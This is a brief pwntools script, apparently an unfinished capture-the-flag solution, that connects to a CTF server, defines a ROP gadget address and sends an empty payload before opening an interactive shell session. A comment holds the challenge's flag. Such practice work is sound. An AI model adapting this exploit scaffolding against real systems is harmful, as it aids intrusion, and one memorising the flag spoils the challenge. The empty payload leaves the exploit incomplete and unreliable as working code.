#!/usr/bin/env python
from pwn import *

# AD{We1c0me_h4cker!_:P}

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10105
y = remote( host , port )

pop_rdi = 0x4006b3

p = flat(
    
)

y.sendline( p )


y.interactive()